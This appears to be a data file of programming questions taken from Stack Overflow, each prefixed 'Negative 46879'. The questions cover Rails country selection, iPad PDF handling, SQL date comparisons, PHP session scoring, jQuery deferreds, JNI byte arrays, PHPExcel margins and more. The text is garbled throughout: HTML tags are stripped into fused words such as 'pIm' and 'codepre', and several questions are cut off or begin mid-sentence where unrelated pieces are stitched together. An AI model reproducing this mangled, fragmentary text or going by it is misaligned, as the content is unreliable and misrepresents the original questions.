Negative 46879 pstrongWhat Im trying to dostrongp  pIm trying to find out if there is a quick way to get countryselect to store integers representing the countries instead of storing the country namesstrings themselves. Im using the a hrefhttpsgithub.comjamesdscountryselect relnofollowcountry select gema.p  pstrongPossible solutionstrongp  pOne way Im thinking this can be done is if I install the gem as a plugin and edit the countries array to have arrays within the main array with integers and a string e.g. COUNTRIES  [[United Kingdom, 1],[United States, 2]] p  pThis way in my form there will be values representing the strings. Then I can have a countryid column in my profiles table where users selected countries id will be stored. I will have a separate table countries that will have the countries stored in it and Ill use the countryid of the profiles table to reference the correct country in the countries table.p  pDoing it this way would mean I would still get the good features of the gemplugin such as having priority countries at the top of the select list. Something I dont know how to do on my own.p  pIt would take long but it could work. If I chose this solution where would I put the plugin vendors folder in my apps directory rightp  pBut if there is a quicker way to do this Id like to do it that way.p  pstrongA bigger picturestrongp  pOk I have a search form where a user can browse the sites users filtering out results byp  ptext typed location gender sexuality marital status countryp  pIm using thinking sphinx and when filtering attributes it seems that the attributes need to be represented integers because everything works but the country.p  pIm using the a hrefhttpsgithub.comjamesdscountryselect relnofollowcountry select gema and it seems to only store strings and not an integer representing the string.p  pI would like to have it store integers instead.p  pstrongHere are some contants I use in my search formsstrongp  precodemodule ApplicationHelper      GENDER             [[Select, nil],[Male, 1],[Female, 2]]      ETHNICITY          [[Select, nil],[Black, 1 ],[White  Caucasian, 2 ],[European, 3 ],[Asian, 4 ],                          [Indian, 5 ],[Middle Eastern, 6 ],[Native American, 7 ],[Hispanic, 8 ],                          [Mixed Race, 9 ],[Other Ethnicity, 10 ]]      MARITALSTATUS     [[ Select, nil],[Single, 1 ],[Dating, 2 ],[In relationship, 3 ],[Married, 4 ],                          [Living Together, 5 ],[Divorced, 6 ],[Separated, 7 ],[Widowed, 8 ]]      SEXUALPREFERENCE  [[ Select, nil],[Straight, 1 ],[Gay, 2 ],[Bisexual, 3 ]]  end codepre  pstrongThe searchbrowse formstrongp  precodelt formtag browserspath, method gt get do gt   ltpgt     Location lt textfieldtag location, params[location] gt ltbr gt     Country lt countryselect country, [ United Kingdom, France, Germany ] gt ltbr gt     Gender lt selecttag gender, optionsforselectApplicationHelperGENDER, params[gender] gt ltbr gt     Ethnicity lt selecttag ethnicity, optionsforselectApplicationHelperETHNICITY, params[ethnicity] gt ltbr gt      Marital status lt selecttag maritalstatus, optionsforselectApplicationHelperMARITALSTATUS, params[maritalstatus] gt ltbr gt     Sexual preference lt selecttag sexualpreference, optionsforselectApplicationHelperSEXUALPREFERENCE, params[sexualpreference] gt ltbr gt     lt submittag Search, name gt nil gt   ltpgt   lt end gt codepre  pas you can see each array has a string and an integer.

Negative 46879 pI have a client request that I am trying to fullfill, but running up against a wall. Ive been asked to create PDF links that open in a specific iPad reader app, such as iBooks or GoodReader, instead of the iPad default. Assume a standard iPad configuration eg they are most likely using Safari. They have a good reason for doing it, mainly that GoodReaderiBooks both handle links to remote PDFs within PDFs more gracefully, and unfortunately thats a requirement.p  pI am pretty convinced and I have done some research on Google but nothing definitive that this cant be done. eg we have no control over what the iPad does with the PDF once we link to it. But then I am not very familiar with the iPad environment or what sort of browser extensionshacks it supports.p  pI am open to alternative suggestions that will accomplish the same goal. The main goal is to create a seamless experience for a small group of people. So it should just work for them.p  pEdit by just work I mean they should open a PDF link from browser and get correct reader. If there is a way to do this via an iPad configuration that is great too, but I have run against a similiar wall in getting that behavior too.p

I welcome suggestions if theres a better approach though.p  pNext, I need to decide where to put the aspectJ code.  I dont want to put it in srcmainjava, because the java compiler will choke on it.  So, Im thinking of defining a new SourceSet, srcmainaspectJ, which only compileJavaAJ knows about.  A SourceSet is supposed to model java code though, so Im not quite sure if this is the correct approach.p  pAny input is greatly appreciated.  Thanksp

Negative 46879 pI am using eclipse and would like to integrate some sort of version control. Ideally, I do not want to use a plugin. I would really like to somehow write the version to a text file in some way.p  pThe reason I would like to do this is because I have a program that needs to track the current version of the workspace. Right now I am manually creating a text file in the workspace folder called Version.XXXX and just reading the name of the file to get the version number. However, I would like to somehow have eclipse do this automatically in case I forget to make the text file manually. p  pAny help or suggestions is greatly appreciated. Thanksp

If we are using a period of 1 strongweekstrong  7 days, then the query should return the difference in the totals consumed for strongthis weekstrong, as compared to the totals consumed stronglast weekstrong.p  pA slight complication is that the dates in the table are not continuous  i.e. there are some missing dates, so the query needs to find the most relevant date when determining dates for period calculations.p  precodeThis is what I have so far   using hard coded dates  SELECT SUMf1.wineglassesdrunk  SUMf2.wineglassesdrunk as winediff,  SUMf1.whiskyshotsdrunk  SUMf2.whiskyshotsdrunk as whiskydiff,  SUMf1.beerbottledrunk  SUMf2.beerbottledrunk as beerdiff  FROM foobar f1 INNER JOIN foobar f2 ON f2.useridf1.userid WHERE f1.userid1  AND f1.dataentrydate BETWEEN 20110108 AND 20110115 AND f2.dataentrydate BETWEEN 20110101 AND 20110108 AND f1.dataentrydate  f2.dataentrydate between 6 and 9 codepre  pThe above SQL is clearly a hack especially the codef1.dataentrydate  f2.dataentrydate between 6 and 9code criteria. I checked the results in excel, and the results from the query above were unsuprisingly wrong.p  pHow can I write this query  and how can I modify it so that it can deal with the non contiguous dates in the databasep  pI am using postgreSQl, but would prefer if possible, database agnostic i.e. ANSI SQL.p

Negative 46879 pI have a theoretical question about how to approach a current project. It is a fairly simple matching quiz using JS  PHP. I am simply taking care of business logic on the server answer checking, score updating such as to roughly follow MVC conventions.p  pMy current setupp  ul liHTML  JS page to allow the user to drag and drop answers onto questions. On a successful drop, the question  answer combo is sent to the followingli liA serverside PHP page to check the answer correctness based on an XML file. I return a few pieces of data in some XML client, such as truefalse and number of attempts at a certain question. strongIn addition, if the answer is correct, I increment a Session Variable on the server to keep track of the users score.strongli ul  pMy question revolves around best practices for setting the above mentioned session variable for tracking the score. I understand that a more persistent setup is most likely preferable, in case of computer shutoff, accidental browser closing, etc...but strictly based on this setup  p  ol liIs this a secure method for storing a score for a final insertion into the databaseli liI eventually will have to pull the score down from the server at the end of the game or even mid game, for that matter, as well. Should I create a simple getter PHP page to pull the score down, and just access the session variable and send it to the clientli liCurrently, the user actually has access to the php serverside page becuase it resides in the same folder as the actual quiz. This is moooost likely a nono  but what is the common practice for hiding this serveronly file from the users prying eyes without having to use authenticationli ol
Negative 46879 pI have a web applciation based on apache, php, jsjquery. One module of the application is initialized when the document is loaded. That sequence calls an init funcion that performs a number of tasks, amongst others it fetches two html dialogs via ajax and inserts them into the existing page. A reference to those dialogs is saved as variables, so that I dont have to specify jquery selectors throughout my scripts but can simply use those variables instead. This work fine, except that there are very few cases now and then... when the variables are undefined when trying to bind a handler to an element inside the fetched dialogs. Which is odd, because apart from that bind the dialogs are usable throughout the application. This suggests that the ajax calls succeed, but aparently there is some kind of race condition, so that now and then the variables are only set emafterem the bind attempt. p  pIn my understanding this should not happen, since the bind is done in the .done part of a when and should only be executed after the ajax retrieval of the dialogs has finished inside the when. p  pAparently I am missing something fundamental here. Anyone got a hint for me  p  pThe following cites code excerpts from the working implementation. They may appear syntactically invalid as some parts, but that is just due to the removal of code parts not relevant here. The unshortened code works fine. p  pThe variables p  precodeShorty.Tracking.Dialog.List Shorty.Tracking.Dialog.Click codepre  pThe initializing sequence p  precodewindow.loadfunction   ...   var dfd  new .Deferred   .when      load layout of dialog to show the list of tracked clicks     Shorty.Tracking.init   .donefunction      bind actions to basic buttons     Shorty.Tracking.Dialog.List.findclose.onclick,function        ...           ...       ...  codepre  pThe shortened init function p  precodeShorty.Tracking.initfunction      ...     var dfdnew .Deferred      two dialogs are used by this plugin     var dialogs       list  Shorty.Tracking.Dialog.List,       click Shorty.Tracking.Dialog.Click           load dialogs from server     .each[list,click],functioni,dialog       if ...          ...         dfd.resolve       else          load dialog layout via ajax and create a freshly populated dialog         .ajax           type     GET,           url      OC.filePathshortytracking,ajax,layout.php,           data      dialog dialog,           cache    false,           dataType json         .pipe           functionresponsereturn Shorty.Ajax.evalresponse,           functionresponsereturn Shorty.Ajax.failresponse         .donefunctionresponse            create a fresh dialog            insert it alongside the existing dialogs in the top controls bar           controls.appendresponse.layout           switch dialog             case list               Shorty.Tracking.Dialog.Listcontrols shortytrackinglistdialog.first               break             case click               Shorty.Tracking.Dialog.Clickcontrols shortytrackingclickdialog.first             switch           dfd.resolve         .faildfd.reject         else       each     return dfd.promise   , codepre  hr  pWith the answer of Bergi I managed to apparently remove the original problem. Until now I could not detect any more failed bind attempts. However I could not follow that suggestion completely in his answer he suggested to remove the switch statement in the initialization method in favor of a direct assignment.

Negative 46879 pI ve been trying to add a half circle to a map view using a custom MKOverlayPathView subclass and a custom class which confirms to  but I cannot get anything to show up on the map view. I use a UIBezierPath to create the path for the circle, but no matter what I try, I cannot see my path...  Does anyone have an example program in which a UIBezierPath is being used as overlay p  pThank youp  pTimp  pEdit Answer to Annas questionp  pI can draw MKCircleViews without any problem, but I seem to struggle with custom subclasses for MKOVerlayPathView. The delegate is set, and an NSLog confirms that my overlay is actually added, only the View part is missing ...p  pBelow the header file for my overlay class. Comments and variables are in Dutch, if anyone wants a translation I can provide it but I think everything should be clear.

Negative 46879 pI am trying to understand this basic notion in DSP architecture and instruction executionp  pBased on Harvard architecture, the CPU can concurrently fetch the data and instruction words... Instruction fetches can take place during previous  instruction execution and not wait for either a finish of  instruction execution or have to stop the processors operation while the next instruction is being fetched.p  pHowever due to my limited knowledge of computer architecture, this question arises to me If the data operands to be manipulated are destined by the instruction word, how is it possible imagine by iteration from very first cycle, the instr. is loaded from prog. memory, then the two operands should be loaded in next cycle and here is the ambiguity now it is the execution timecycle turn, so if while loading the data, the next instr. was loading simultaneously, the previous loaded instr. was lost and thus what could happen to the execution of that Or am i wrong and the execution is done immediately by loading the data from memory to data registerp  p code example MPYF3 AR0, AR1, R0p  paddendum I think, Since there is no register file so there is no load of any data into any register  directly done through memory So in my opinion, after very first instr. has fetched, in next cycle the required data operands destined by the prev. instr. are manipulated instr. exec. through memory by functional unit and meanwhile the next instr. word is fetched, and the address of operands are also updated as a result of exceution, through address register ALU All because each of this operations data access, arithmetic operation, address update, instruction fetch are processed via distinctive  physical  architecture.p  pIs there anyone who can assure me about this my interpretation Explanation of a typical instruction iterated over cycles making use of concurrent data and instruction access in DSP Harvard architecture is greatly appreciated.p  pThanks in advancep

Negative 46879 pIve got the following problemp  pI have a UITabBarController that displays different information in each tab about e.g. a CD. The user can use UIInterfaceOrientationLandscape to see just the cover. To go to the next CD the user can go back and select a new CD and information are displayed again in UITabBarController. All this works fine. Additionally, to make it easier watching a lot of CDs, its possible to go to the next CD with a swipe gesture in landscape or portrait orientation. Then I just change the tabBarController.viewControllers and set the viewControllers that display information of the new CD.  The Problem is now after I swiped to the next CD the didRotateFromInterfaceOrientation method is never called again and I cannot change from landscape mode to portrait mode. The swiping gesture keeps the didRotateFromInterfaceOrientation method from being called I only have this problem with iOS 4.2.1.

Negative 46879 pI need to log specific activities of my web application Python based  SQL alchemy with Postgres and I dont want to either dump log information on my Postgres database why fill it up with mostly rubbish  or use a log file hard to search.p  pIdeally I would like to throw everything in another database and do this in an asynchronous way. With the logging being asynchronous I dont need to worry about the write operation failing and breaking to code that does all the important business. Also, if I miss a few logging events, it is probably no big deal.p  pMongo seems like an excellent solution since it is well suited for writing operations and easy to setup.p  pThe problem is that I have not managed to find any python tools that cover my needs and in particular the asynchronous requirement.p  pAny thoughtsp

Negative 46879 pI am going to write a desktop application, but I am conflicted concerning which language to use. It the desktop application will need to have a good GUI, and to be extendable hopefully good with modules of some sort. It must be completely crossplatform, including executable in various tablet environments. I put this as a requirement while realizing that some modification will no doubt be necessary. The language should also have some form of networking tools available.p  pI have read a hrefhttpintrocs.cs.princeton.edujavafaqc2java.html relnofollowhttpintrocs.cs.princeton.edujavafaqc2java.htmla and understand the differences between Java and C very well. I am looking not necessarily at C, but more at a C variant.p  pIf it is a complete tossup, I will use Java as I know Java much better. However, I do not want to use a language that will be inferior for the task I wish to accomplish. Thank you for all suggestions and explanations.p  pNOTE If this is not the correct stack for this question, I apologize. It seemed appropriate according to the rules.p
Negative 46879 pSo people complained about how PHP Scripts using DOCUMENTROOT break when Apache is being run with VirtualDocumentRoot and modvhostalias since DOCUMENTROOT doesnt get set properly. Apache evidentally fixed this sometime ago and the brief notes are here a hrefhttpsvn.apache.orgviewvcviewrevisionamprevision1132494 relnofollowhttpsvn.apache.orgviewvcviewrevisionamprevision1132494ap  pSadly, there isnt enough detail explaining how to actually override the DocumentRoot on a perrequest basis. Im guessing it must be done with modrewrite somehow but Im not certain. Does anyone know how to do thisp

My questions arep  pi Is it okay the way I have coded this in regards to the concern I have I think the answer  is No, but just want to check with the experts here. ii Is use of codeevalcode as I have indicated an acceptable solution iii If answer to ii is no, what is the alternativep  pThank you for reading through this.p

Negative 46879 pI am using PHP to implement HTTP Basic Authentication on the Apache HTTP Server version 2.2. The only directory I want to passwordprotect is a subdirectory of the main public web root of my website for example purposes, lets call the protected directory private, and its realm Private.p  pIf possible, I want users that have already been authenticated in the Private realm  and emthose users onlyem  to see customised content on the web sites home page and any other web page, for that matter.p  pstrongWhat I want to know is, is it possible to do this without forcing a login prompt at the toplevel of my domains toplevel e.g. a hrefhttpwww.jdclark.org relnofollowcodewww.jdclark.orgcodea or, for that matter, any other URIs outside if the Private realmstrongp  pstrongEDITstrongp  pOne technique that I have thought about applying to achieve the above is as follows When a user has been authenticated into the Private realm via the access control in the private directory,  a session cookie could be set in PHP. I could then check for the presence of this cookie which could possibility contain a session ID or some kind of unique random string, but although Im dont proclaim to be an IT security expert, this method feels a bit hackish, and something tells me that this is insecure e.g. would it be trivial for a malicious user to spoof that cookie with an HTTP header. Any advice would be very much appreciated.p

Negative 46879 pIm attempting to set page margins in PHPExcel 1.7.8 using mPDF as the renderer, and Im getting nowhere.  I found a thread somewhere where Mark Baker mentions having written in support for page margins for pdfs for version 1.7.8, but Ive come up empty as far as how to actually implement them.p  pNear as I can tell, its something separate from setting margins for Excel documents, as the following works fine if I set my output to xlsp  precodepageMargins  sheetgtgetPageMargins pageMarginsgtsetTop.25 pageMarginsgtsetBottom.25 pageMarginsgtsetLeft.2 pageMarginsgtsetRight.2 codepre  pWhen I switch back to pdf output, the margins appear to be nearly an inch on each side.

Ive just spent 8ish hours overhauling the code to output an html page that can be sent to mPDF directly, but PHPExcel is so much easier to work with for pages needing a very specific format as mine does, that Id rather do it in PHPExcel if possible.  p  pHas anyone worked with margins in PHPExcel using mPDFp

Negative 46879 pI am building a C project. This project is going to use NVidias Tesla through CUDA.

Negative 46879 pwhat I want to do is to extend the MainMenu of the Windows Mobile Winforms to have a second menu level. If you tip short on the menu button it will do the event action but if you press it longer a second menu level should pop up. The MainMenu is very deficient in its managed functions so I had to find another way. I archived this by deriving MainMenu and add some SubClassing.  p  precodepublic delegate IntPtr Win32WndProcIntPtr hWnd, int msg, int wParam, int lParam  [DllImportcoredll.dll, EntryPoint  FindWindow, SetLastError  true] public static extern IntPtr FindWindowstring lpClassName, IntPtr lpWindowName  [DllImportcoredll.dll] public static extern bool EnableWindowIntPtr hWnd, bool bEnable  [DllImportcoredll] public static extern IntPtr SetWindowLongIntPtr hWnd, int nIndex, Win32WndProc newProc  int GWLWNDPROC  4 int GWCHILD  5  IntPtr oldToolbarProc IntPtr oldMenuWorkerProc  void Hookup         find the window to hook     var hWndHooked  FindWindowHHTaskbar, IntPtr.Zero     if hWndHooked  IntPtr.Zero         return      enable the taskbar, not realy necessary     EnableWindowhWndHooked, true                find the menuworker window     var menuWorkerWnd  FindWindowmenuworker, IntPtr.Zero     if menuWorkerWnd   IntPtr.Zero         return      var toolbarWnd  GetWindowmenuWorkerWnd, GWCHILD     if toolbarWnd  IntPtr.Zero         return      Win32WndProc newMenuWorker  MenuWorkerProc     oldMenuWorkerProc  SetWindowLongmenuWorkerWnd, GWLWNDPROC, newMenuWorker      Win32WndProc newToolbar  ToolbarProc     oldToolbarProc  SetWindowLongnewToolbarWnd, GWLWNDPROC, newToolbar  codepre  pThe toolbar subclassing measures the time between WMLBUTTONDOWN and WMLBUTTONUP and depending on the time leaped between these events a context Menu is invoked. p  pIf the context menu is invoked the menuworker subclassing must suppress the WMCOMMAND of the pressed button. p  pThis works fine for a single window. But if I use it on a second form they will recongize both the same toolbar and menuworker and application crashes.p  pWhat I tried is to hook and unhook  in the onFocus onLostFocus events of the parent form. But sadly onFocus is called before the right window is visible and it also gets the wrong window handle p  pWhat I did now I know a very bad hack is to start a time in the onFocus event and wait for 1000ms and hook it up then. This results in a 5050 change to hook the right window.. p  pIsnt there a better solution for subclassing the right windowp

Negative 46879 pI searched for this and found similar answers but they were more math based than programming based, and I need a little help putting it in to code.p  pI have an arbitrary shape, but lets call it a diamond for now, with the following coordinatesp  pA  0,0p  pB  50, 50p  pC  0, 100p  pD  50, 50p  pThink of the movement contraints on this as if you had a rubber band and moved a peg.  The lines will always connect but their orientation to one another must not change.  So since the slope of AB is 1, it needs to remain 1.  I have that part working fine.p  pNow, say I move B such that it rests at 100, 100.  I know the slopes of AB unchanged, BC before B was moved, and after, but after is useless and wrong, CD unchanged and DA unchanged.  I also know the coordinates of A, B and D.  I need to find the position of C, such that all slopes remain unchanged and it rests at the logical point where BC and CD should intersect.p  pMathematically, I know C belongs at 50, 150 now but I need a generalized formula to figure this out.  This is a single example so what Im looking for is something generalized enough to reuse.  Of course, there are snags when lines are parallel or vertical but I can handle that.p  pThis picture should help visualize it.  B started at B and I moved it to B2.  C needs to move to p  pThanks a ton if you can helpp  pimg srchttpi.stack.imgur.com4y6lC.gif altLine constraintsp  pEDIT  This seems to be the answer, but Im anything but a math whiz and dont get how it translates in to some sort of generalized formula.  a hrefhttpstackoverflow.comquestions563198howdoyoudetectwheretwolinesegmentsintersectrq1How do you detect where two line segments intersectap

I copied that function over to my script, changed git appropriately, and did not have any luck.p  pThe trimmed down script is as followsp  precodefunction fishprogusingcommand   set cmd commandline opc   set subcommands argv   if [ count cmd  math count subcommands  1 ]     for i in seq count subcommands       if not test subcommands[i]  cmd[math i  1]         return 1       end     end     return 0   end   return 1 end  function fishgitneedscommand   set cmd commandline opc   set startsWith echo cmd[1]  grep  E prog    theres got to be a better way to do this regex, fish newb alert   if [ count cmd  1 ]      wtf, this is always false  it this the problem     if [ cmd[1] eq cmd[1] ]       return 1     end   end    return 0 end  complete nofiles c prog a bar n fishgitneedscommand  complete nofiles c prog a foo n fishgitneedscommand  complete nofiles c prog a a n fishprogusingcommand foo  complete nofiles c prog a b n fishprogusingcommand foo  complete nofiles c prog a c n fishprogusingcommand foo   complete nofiles c prog a baz n fishgitneedscommand  codepre  pAny suggestions on how to make this work is much appreciated.p

Negative 46879 pAs outlined earlier, a hrefhttpstackoverflow.comquestions16859200runningnet20executableinnet40programRunning .Net 2.0 executable in .Net 4.0 programa I was having problems running a .Net 2.0 exe from a .Net 4.0 program. I solved that program somewhat by installing .Net 2.0. Now the program can run properly under certain situations. Namely, if I work with files exclusively in the same directory as my program. What happens is the following p  ol liUser selects a fileli li.Net 2.0 exe acts on that file, creates a new fileli li.Net 2.0 exe acts on new fileli ol  pThis all works fine if the original file is in the same directory as the program and the .Net 2.0 exe. The files created by the 2.0 exe are saved in that directory and all is good. However if the original file is NOT in the same directory as the program, the 2.0 exe creates the new file in the folder of the original file. This causes the program to crash, since it expects the new file to be in the same directory as the 2.0 exe. Its worth noting that this only happens in XP running .Net 2.0 and 4.0. On my main Windows 7 machine running .Net 4.5 this problem doesnt occur. p  pHere is the code where I call the 2.0 exep  precodeProcess process  new Process ProcessStartInfo startInfo  new ProcessStartInfo startInfo.FileName  cmd.exe startInfo.Arguments  C 2.0EXE i   userFile   o   resultsFile process.StartInfo  startInfo startInfo.WorkingDirectory  Environment.CurrentDirectory process.Start process.WaitForExit codepre  pIs there some obvious solution Im missing Preferably not something involving modifying the path, since as I plan to distribute this application, I dont want to make the end user do that.p  pEdit Even when I force the working directory to be some constant directory instead of Environment.CurrentDirectory, it still wont exactly work. Now it saves the file in the correct location step 2, but the 2.0 exe then looks for the new file in the same folder as the original file i.e. step 3 fails. Again this only happens on the XP machine running .Net 4.0 and 2.0.p

Negative 46879 pI am making a fairly complex front page that in essence is a threaded discussion forum. At present all is functional but I want to replace the links after the message that allow one to delete, reply, archive and other functions. At present the links are all text. I can use small images and make them look nicer. However on a busy front page with lots of messages and threads a whole bunch of images will make the whole page look overwhelming. p  pThe way it works for now is each iteration of the call to function that reads a message from db will start a ul and this allows me to nicely pad the child messages and the depth.p  pHere is what I want to do  create a small popup menu that will show up when someone hovers over the actual message. Because my current way of showing threaded messages using ul and li when I tried to use jqueryui menu widget it wrecks the formatting.p  pSorry about all the rambling but is there a way to show a slim line of links above a message when someone hovers over it and each message in the page will obviously need to have different links [to allow blah.phpmessageid...].p  pI have been looking at jqueryui and learnt it to a tiny extent and still reading the tutorial. Is there a way of doing what I asked abovep  pThanksp

Negative 46879 pIm doing some consulting for a site that is about to be redone, but still has to at least partially function in the mean time. At the moment my biggest issue is that on some pages the links are not clickable in FF or Chrome when the page loads, but by some magic when I open the developer tools f12 for either everything starts working. Additionally, when the page initially loads trying to inspect element does not work properly, but it works fine after the dev tools are open. My best guess here is that theres something else on the page thats effectively covering up the rest of the page, but I havent been able to find it yet. Ive tried adding a zindex and playing with positioning to no avail, so if anyone has seen this before or has any thoughts Id be most appreciative. p  pa hrefhttpswww.petermichaelfoundation.orgevents.phptitleUpcomingEventsamptype2 relnofollowhttpswww.petermichaelfoundation.orgevents.phptitleUpcomingEventsamptype2a and a hrefhttpswww.petermichaelfoundation.orgnews.phptitleFoundationNewsampid1 relnofollowhttpswww.petermichaelfoundation.orgnews.phptitleFoundationNewsampid1a are both good examples of the problem in action.p

So following a hrefhttpmsdn.microsoft.comenusdatagg610409 relnofollowthisa Microsoft tutorial, I added the codeAdventureWorks2012code mdf file to the project. p  pNow if I use the codeDataSetcode option in the wizard, the three database tables I want are added to the codedatasourcescode window and I can do a drag amp drop to create fields on my window automatically and have the binding setup. p  pstrongHowever, that is done with SQL Adaptors.

Negative 46879 pIs anyone using couchbase 2.0 with PHP 5.4 I ask because the PECL libraries for PHP appear to not support PHP5.4s new interfaces. This is a real bummer as Id really like to start taking advantage of 5.4s support for codeJsonSerializablecode which would appear to be a nice compliment to folks living in the JSON world of Couchbase.p
Negative 46879 pIm basing a maze generator program on the Prims algorithmp  pThis algorithm is a randomized version of Prims algorithm.p  blockquote   ol   liStart with a grid full of walls. li   liPick a cell, mark it as part of the maze.

How do I know if two Cells are connected by a wall remember that each cell has 4 wallsp  pI thought about using the equals function. Im just asking for a pseudocode or your best explanation that would make the things easier.p  pMy Wall class has three attributes bool isWalldetermines if it is a wall or a passage between cells int x int y identifiers. p  pIf you think that I would need more attributes Ill be pleased to know. I know theres an easy way, Im just stuck   Thanks for your timep
Negative 46879 pMy question is a rather simple one.  Ive read that the recommended method of retrieving the autoincrementid value of a row Ive inserted in mysqli is the codemysqliinsertidcode function.  However, Im not too familiar and had a question  This is all theoretical at this pointp  pFor these purposes hence the mysqli bit this is all going to be from a PHP web application.  Say multiple users are on the application at once and another row is inserted from a different page between the time that I insert my row and the time that I call codemysqliinsertidcodep  pWould that return an incorrect value, or does MySQL have some sort of feature to prevent such a thing  Or am I simply overestimating the possibility of such a scenariop  pThanks for your time.p
Negative 46879 pI am working in a project where omniture tracking is implemented and it works fine without any issues.

Negative 46879 pI have this challenge with my Android APPp  pI have and dialog  I mean an activity created as a dialog. Now, user presses the home button and leaves the app  later holds the home button and displays the Recent apps list.

Negative 46879 pI am sure there must be a duplicate of my question, but have not found it. I am a novice trying to finally learn OOP.

I have also tried change the order in the init modules, but it doesnt seem to make a difference if the call to super is made before or after the other attributes. The arguments are flowing through from ShortPut to Put to Option, but it doesnt seem to like the attribute in the middle class.       p  pfollowup  I cant call the put class directlyp  precodeput  Putstriketype1, expmonths6, strikesteps2, ratio2 TypeError object.init takes no parameters codepre  pAny insights into what is going on would be greatly appreciated.p

Negative 46879 pA common practice that I do when building models in Abaqus, is to fit the material property. For example, I try out all the possible material properties and look at the surface deflection given by the model, and then find out the one that matches our experimental observation the best. Practically, I compare the value with model output and experimental data, get an Rsquared value and try to minimize the value of 1.  R2.p  pI have been using the scipy optimization toolbox to do this in Abaqus. However, there is one question there are cases where the model would not converge with certain given parameters that the optimizer try. In these cases, what values should I set to R2 Should I set it to 1.  numpy.inf, or 1.  numpy.nan assuming import numpy as npp  pMoreover, there are situations where I use optimization functions that does not support general constraints, for example modulus1  modulus2 if it asks me to submit a job where modulus1 lt modulus2, can I just return a 1.  np.inf or 1.  np.nan as penaltyp  pThe problem happens because there is no way to know where the model would fail to converge in the parameter space apriori. Any help would really be appreciated. Thank you so muchp

Negative 46879 pHello I am a beginner programmer. Ive been learning how to use Python, JavaScript from Codecademy and little bit of C from school.

Negative 46879 pI was asked to create a report comparing all clients most recent order and their previous order, and then compare and return only those who placed orders with a higher amount as their next order. I really hope this makes sensep  pThe order history table is laid out in such a way as each customer has an Order number that is sequential to that Customer E.G. If a customer places 5 orders, then their top order number is 5, which should make this easier.

I really dont want to hold a list of subscribers in the model, which is against the principle of loose coupling in a way. But if I only add a callback function to the codeTestModelcode in the codesubscribecode method, Im not able to access the codethis.stringcode variable in the codeTestViewcode. Because codethiscode points to the TestModel which has called the codetalkcode method. My workaround is the codeselfcode which leads to the need of a subscriberlist in the Model.p  pI also tried to initialize a self variable outside of the codeTestViewcode functions, in the codeTestViewcode function which is called and returned by RequireJS. But this function is only called once, and therefore the variable acts like a static variable in Java and is not unique in every instance of codeTestViewcode.p  pIs there a possibility to get a codeselfcodecodethiscode variable in the codetalkcode functions to access the string without handling it over by the codeTestModelcode like its done nowp

Negative 46879 pI have a table for users and a table for documents.  Documents have exactly one user as an owner, and for the application Im building, I know that I will typically be accessing a group of documents associated with a single given user.p  pLets say the average user has K documents, and certain common queries fetch all of the documents for a given user.  I dont want my database PostgreSQL to have to do K disk seeks on average to fetch all the documents for a user.  Ideally, the documents would be stored in contiguous blocks so that fetches would only require a few seeks.p  pIs it possible and reasonable to organize the document table schema to create such locality  I know that noSQL implementations do this all the time E.g. the a hrefhttpstatic.googleusercontent.comexternalcontentuntrusteddlcpresearch.google.comenusarchivebigtableosdi06.pdf relnofollowBigTable papera talks about how row keys for web tables are assigned by URL, except that the url is reversed, e.g. com.cnn.www, so that all the pages for CNN are located near eachother in the data store.  It doesnt appear possible to something similar in Postgres because the tables cannot be indexorganized, although it might be possible in MySQL w InnoDB.  a hrefhttpstackoverflow.comquestions13190720whatistheorderofrecordsinatablewithacompositeprimarykeyThis posta comes to a similar conclusion.p

Negative 46879 pWhat is the benefits of using strongEncodePointerstrong  strongDecodePointerstrong in Windowsp  pcodeMSDNcode saybr     Encoding globally available pointers helps protect them from being exploited.     The strongEncodePointerstrong function obfuscates the pointer value with a secret so that it cannot be predicted by an external agent. The secret used strongEncodePointerstrong is different for each process.p  pNow question is If the attacker is outside of my program, then its address space is different from my address space, so an address in my app is not usable for it. and if it can execute a code in my address space it can call strongDecodePointerstrong and use that address to call encoded pointer.p  pSo what is the usage of this functions and how they help me with increased securityp

Negative 46879 pMy app has a ListView where data is added from the top, automatically through setData on a Adapter. When data is set, usually most of the data remains the same, and only a few items are added at the top. Typically tens of items exist, and 12 items are added at the top every 10 seconds.p  pRight now the user experience sucks. It completely redraws the list with the new data. If a user was reading an item just before data got updated, he will lose his old position and will need to scroll to find it again.p  pWhat I would like to see as a more human compatible transition  animation, where the old data gets pushed down, and new items are added at the top. Or  new data pushes old data down  and I can see this animation. Something like a ticker  only vertical, and items are on a listview.p  pI went through ListViewAnimations, and JazzyListView.

Negative 46879 pOk I am writing a code to modify .ppm image files. A pic gets read in and stored in a PPM class object. Each Pixel is stored in a RGB struct. Eventually it will convert all the colors in the original image to ones from a small color pallet. It does this by using a distance function I created that calculates how close one color is to another. It loops through the color pallet and inserts them into a map with the key being the distance from the current pixel in the image. Somehow ive messed up the syntax with inserting it into the map.

Negative 46879 pI an developing a Visual C 32bit application in Visual Studio 2012.  One module in my application is developed in JAVA and is available as a jar library only. I need to call functions from the jar file in my Visual C Console application. These functions are implemented in JAVA. My Visual C application will call these functions. These functions will return some value message back to the Visual C application.p  pMost of the linkstutorials talk using JNI for accessing CC code in a JAVA Application.

Negative 46879 pIm calling a C function through JNI which will return a byte array. This worked like a charm until I tried to clean up the accessing Java class by removing unneccessary debug output I was printing to the console.

If I try to replace this with any other operation accessing the array such as merely assigning the first array element to a variable, this will also trigger a segmentation fault.p  pThis is how I am returning the array in the C functionp  precode c[] is a char array of length mlen which at this point has already been filled by a library call jbyteArray out  envgtNewByteArrayenv, mlen jbyte jBuf  jbyte callocsizeofjbyte, mlen for int i  0 i lt mlen i       jBuf[i]  jbytec[i]  envgtSetByteArrayRegionenv, out, 0, mlen, jBuf freejBuf  return out codepre  pAnd this is what the method in the wrapper class does basically removing some zeropadding which the C library I am using adds to the array and then returning itp  precode    byte[] cpadded  jnicfunctionmpadded, mpadded.length, n, k     return Arrays.copyOfRangecpadded, CZEROBYTES, cpadded.length codepre  pI can avoid the segmentation fault by either printing my debug output between making the JNI call and accessing the array or just calling this.wait10, so I suspect that the JNI call may actually be returning before it actually got round to filling the arrays memory area. I cant seem to find any documentation andor similar questions about this behaviour though, as I would expect if this was the case.p  pAny ideas on how to fix this without printing unneccessary stuff or just waiting for an arbitrary timep

Negative 46879 pSo I have spent a long time looking to see if there is a solution for this.  Basically, the below code allows me to press on a button, when I press actiondown the pressed version of the button is displaying good, then when I remove my finger the graphic returns to normal actionup.p  pThis part is working good BUT I need the ACTIONDOWN to stay active a little longer after the user presses the button and not return to ACTIONUP so fast.

